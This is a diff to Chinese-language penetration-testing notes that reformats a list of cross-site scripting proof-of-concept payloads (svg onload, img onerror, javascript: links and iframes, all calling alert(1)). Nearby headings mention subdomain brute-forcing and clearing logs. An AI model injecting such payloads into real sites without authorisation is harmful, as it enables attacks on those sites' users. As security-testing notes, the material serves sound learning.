@@ -36,8 +36,8 @@ DNS 子網域爆破 -> 尋找目標企業可能遺忘或未受保護的子網域
 - <svg/onload=alert(1)>
 - <img src=# onerror=alert(1)>
 - <a href="javascript:alert(1)">g</a>
-<input type="text" value="g" onmouseover="alert(1)" />
-<iframe src="javascript:alert(1)"></iframe>
+- <input type="text" value="g" onmouseover="alert(1)" />
+- <iframe src="javascript:alert(1)"></iframe>
 
 ## 清除紀錄
 ## 撰寫報告
